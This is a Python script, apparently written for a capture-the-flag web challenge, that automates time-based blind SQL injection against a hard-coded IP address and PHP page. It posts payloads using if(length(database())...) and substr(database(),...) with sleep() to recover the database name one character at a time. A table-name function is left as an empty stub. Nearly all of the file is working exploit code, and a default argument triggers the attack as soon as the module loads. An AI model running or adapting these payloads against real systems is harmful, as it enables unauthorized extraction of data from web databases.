# -*- coding:utf-8 -*-
"""
@author: jim

"""
import requests
import time
from bs4 import BeautifulSoup as bs
sleeptime = 3

#                          测试字符串
chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_!@#$%^&*()'

#                    post方法的url
url='http://123.206.87.240:8002/chengjidan/index.php'
#     请求头
head={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'application/x-www-form-urlencoded',
    'Content-Length':'87',
    'Connection':'close',
}

def get_database_length_postmethod_sleepmethod(url=url):
    global sleeptime
    '''
    only pass the url
    parameter payload structure by yourself
    '''

    #           if database name length greater than 100, change the parameter(100) below
    for i in range(1, 100):
        startime = time.time()
        #               payload id parameter
        payload = {
            'id': "1' and if(length(database())>%s,sleep(%s),1) #" % (i,sleeptime)
        }
        #   print testing message   get payload id
        print('testing payload%s:'%(i),payload.get('id'))

        r = requests.post(url, payload)

        if (r.text != None):
            endtime = time.time()

        delaytime=endtime - startime

        #
        if(delaytime<sleeptime):
            print('the length of database name is :',i-1)
            return i




#   default use get_database_length_postmethod_sleepmethod to get the length of database
def get_database_name_postmethod_sleepmethod_default(url=url,database_name_length=get_database_length_postmethod_sleepmethod()):
    global sleeptime
    global chars
    database_name=''

    for char_num in range(1,database_name_length+1):
        for char in chars:
            #直接利用字符
            payload = {
                'id': "1' and if(substr(database(),%s,1)='%s',sleep(%s),1) #" % (char_num, char, sleeptime)
            }

            startime=time.time()
            print('testing payload%s:'%(char_num),payload.get('id'))
            r=requests.post(url,payload)
            if(r.text!=None):
                endtime=time.time()
                delaytime=endtime-startime
                if(delaytime>sleeptime):
                    database_name+=char
                    print(database_name)
                    break
    return database_name

#   same as get_database_name_postmethod_sleepmethod but without default parameter
def get_database_name_postmethod_sleepmethod(url,database_name_length):
    global sleeptime
    global chars
    database_name=''

    for char_num in range(1,database_name_length+1):
        for char in chars:
            #直接利用字符
            payload = {
                'id': "1' and if(substr(database(),%s,1)='%s',sleep(%s),1) #" % (char_num, char, sleeptime)
            }

            startime=time.time()
            print('testing payload%s:'%(char_num),payload.get('id'))
            r=requests.post(url,payload)
            if(r.text!=None):
                endtime=time.time()
                delaytime=endtime-startime
                if(delaytime>sleeptime):
                    database_name+=char
                    print(database_name)
                    break
    return database_name

def get_table_name_postmethod_schemamethod(database_name):
    pass




